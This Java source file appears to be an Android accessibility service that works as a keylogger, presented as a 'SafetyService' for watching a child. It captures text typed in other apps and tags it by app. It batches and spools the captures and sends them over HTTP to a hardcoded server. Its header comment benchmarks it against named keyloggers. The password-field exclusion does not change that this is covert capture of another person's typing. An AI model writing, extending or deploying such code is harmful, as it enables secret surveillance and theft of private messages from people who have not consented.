package com.example.setup;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

/**
 * Background text capture + app-window tracking.
 *
 * Improvements over the three reference loggers:
 *  - password fields never reported (LokiBoard, Smart-Keylogger and Gokul all
 *    log passwords: the IME sees every key, the two accessibility demos never
 *    check the flag)
 *  - package + app label on every event (Smart-Keylogger only tags the device;
 *    the others have no context at all)
 *  - trailing debounce + batching (Smart batches, but clears its queue before
 *    the POST succeeds; here a non-2xx/exception puts events back on disk)
 *  - device model on every batch, so several phones never mix
 *  - no storage permission and no IME replacement: app-specific spool only
 */
public class SafetyService extends AccessibilityService {

    private static final String BASE = "http://192.168.1.42:8080";
    private static final long DEBOUNCE_MS = 350;
    private static final long BATCH_DELAY_MS = 1200;
    private static final int BATCH_MAX = 8;
    private static final int SPOOL_ITEMS = 200;
    private static final long SPOOL_BYTES = 48 * 1024;
    private static final int FLUSH_CHUNK = 10;

    private Handler ui;
    private Runnable pendingSender;
    private Runnable batchFlush;
    private boolean flushScheduled;

    private String pendingText;
    private String pendingPkg;
    private String pendingApp;
    private String lastKey;
    private int seq = 0;

    private TypingBatch batch;
    private EventSpool spool;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || ui == null) return;

        int type = event.getEventType();
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            CharSequence p = event.getPackageName();
            if (p != null) {
                UsageTracker.onWindow(p.toString());
                UsageTracker.tick();
            }
            lastKey = null; // new screen -> the same text is not a duplicate
            return;
        }
        if (type != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                && type != AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            return;
        }

        CharSequence pkgName = event.getPackageName();
        String pkg = pkgName == null ? null : pkgName.toString();
        if (pkg != null && pkg.equals(getPackageName())) return;

        boolean password = event.isPassword();
        if (!password) {
            try {
                AccessibilityNodeInfo src = event.getSource();
                if (src != null) password = src.isPassword();
            } catch (Exception ignored) {
                // some IME nodes throw when read outside their window
            }
        }

        String text = TypingPayload.normalize(event.getText());
        if (!TypingPayload.shouldSend(text, pkg, password, lastKey)) return;

        pendingText = text;
        pendingPkg = pkg;
        pendingApp = AlertCenter.label(this, pkg);

        ui.removeCallbacks(pendingSender);
        ui.postDelayed(pendingSender, DEBOUNCE_MS);
    }

    @Override
    public void onInterrupt() {
        // Accessibility service interrupted - nothing to do.
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                | AccessibilityEvent.TYPE_VIEW_FOCUSED
                | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        info.notificationTimeout = 50;
        setServiceInfo(info);

        UsageTracker.sendHome = () -> {
            try {
                performGlobalAction(GLOBAL_ACTION_HOME);
            } catch (Exception ignored) {}
        };

        ui = new Handler(Looper.getMainLooper());
        pendingSender = this::stagePending;
        batchFlush = this::flushBatch;
        batch = new TypingBatch(BATCH_MAX);
        spool = new EventSpool(new File(getFilesDir(), "typing-spool.log"),
                SPOOL_ITEMS, SPOOL_BYTES);

        Thread t = new Thread(this::flushSpool, "typing-spool-flush");
        t.setDaemon(true);
        t.start();
    }

    /** Debounce elapsed: convert the latest text into one batch entry. */
    private void stagePending() {
        String text = pendingText;
        String pkg = pendingPkg;
        String app = pendingApp;
        pendingText = null;
        if (text == null) return;

        lastKey = TypingPayload.key(pkg, text);
        boolean full = batch.add(new TypingBatch.Event(
                text, pkg, app, System.currentTimeMillis(), ++seq));

        if (full) {
            ui.removeCallbacks(batchFlush);
            flushScheduled = false;
            flushBatch();
        } else if (!flushScheduled) {
            flushScheduled = true;
            ui.postDelayed(batchFlush, BATCH_DELAY_MS);
        }
    }

    private void flushBatch() {
        flushScheduled = false;
        List<TypingBatch.Event> events = batch.drain();
        if (events.isEmpty()) return;

        final String body = TypingBatch.toJson(deviceName(), events);
        Thread t = new Thread(() -> {
            if (deliver(body)) {
                flushSpool();
            } else {
                // keep every event for the next successful round
                for (TypingBatch.Event e : events) spool.add(e.toJson());
            }
        }, "typing-batch");
        t.setDaemon(true);
        t.start();
    }

    /** Replay queued events oldest-first, only removing what the panel accepted. */
    private void flushSpool() {
        List<String> queued = spool.drain();
        int i = 0;
        while (i < queued.size()) {
            int end = Math.min(i + FLUSH_CHUNK, queued.size());
            List<String> chunk = new ArrayList<>(queued.subList(i, end));
            if (!deliver(TypingBatch.wrap(deviceName(), chunk))) {
                for (int j = i; j < queued.size(); j++) spool.add(queued.get(j));
                return;
            }
            i = end;
        }
    }

    private static String deviceName() {
        String maker = Build.MANUFACTURER == null ? "" : Build.MANUFACTURER.trim();
        String model = Build.MODEL == null ? "" : Build.MODEL.trim();
        String s = (maker + " " + model).trim();
        return s.isEmpty() ? "android" : s;
    }

    /** POST one JSON batch; true only on 2xx. */
    private static boolean deliver(String json) {
        HttpURLConnection conn = null;
        try {
            String ip = KeepAliveService.localIp();
            String url = BASE + "/kid-alert-batch"
                    + (ip != null ? "?ip=" + URLEncoder.encode(ip, "UTF-8") : "");
            byte[] bytes = json.getBytes(StandardCharsets.UTF_8);
            conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setConnectTimeout(4000);
            conn.setReadTimeout(4000);
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            conn.setRequestProperty("Accept", "application/json");

            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
            os.write(bytes);
            os.flush();
            os.close();

            int code = conn.getResponseCode();
            BufferedReader reader = new BufferedReader(new InputStreamReader(
                    code >= 400 ? conn.getErrorStream() : conn.getInputStream(),
                    StandardCharsets.UTF_8));
            while (reader.readLine() != null) { /* drain */ }
            reader.close();
            return code >= 200 && code < 300;
        } catch (Exception ignored) {
            return false;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }
}
